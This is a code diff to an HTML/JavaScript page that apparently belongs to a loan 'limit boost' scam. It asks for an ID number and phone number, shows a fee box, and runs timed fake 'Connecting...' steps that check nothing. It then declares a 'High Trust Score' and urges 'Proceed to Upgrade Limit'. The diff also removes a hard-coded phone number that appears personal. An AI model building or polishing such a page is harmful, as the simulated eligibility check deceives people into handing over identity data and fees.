@@ -183,7 +183,7 @@ button {
       <div class="info-box" id="modalFee"></div>
 
       <input class="input" placeholder="ID Number">
-      <input class="input" value="0704343709">
+      <input class="input" placeholder="Enter phone number">
 
       <div class="modal-actions">
         <button class="cancel-btn" onclick="closeModal()">Cancel</button>
@@ -220,7 +220,6 @@ function getFee(a){
 function render(){
   const app = document.getElementById("app");
 
-  /* STEP 1 */
   if(step===1){
     app.innerHTML = `
     <div class="card">
@@ -231,7 +230,6 @@ function render(){
     </div>`;
   }
 
-  /* LOADING */
   if(step>=2 && step<=5){
     const texts = [
       "Connecting...",
@@ -248,19 +246,17 @@ function render(){
     setTimeout(()=>{step++;render();},1500);
   }
 
-  /* SUCCESS */
   if(step===6){
     app.innerHTML = `
     <div class="card">
       <div class="success-icon">✓</div>
       <h2>Congratulations!</h2>
       <p>High Trust Score Detected. 
-      <span class="phone">0704343709</span> is eligible for a boost.</p>
+      <span class="phone">Your number</span> is eligible for a boost.</p>
       <button class="dark" onclick="next()">Proceed to Upgrade Limit</button>
     </div>`;
   }
 
-  /* LIMITS */
   if(step===7){
     app.innerHTML = `
     <div class="card">
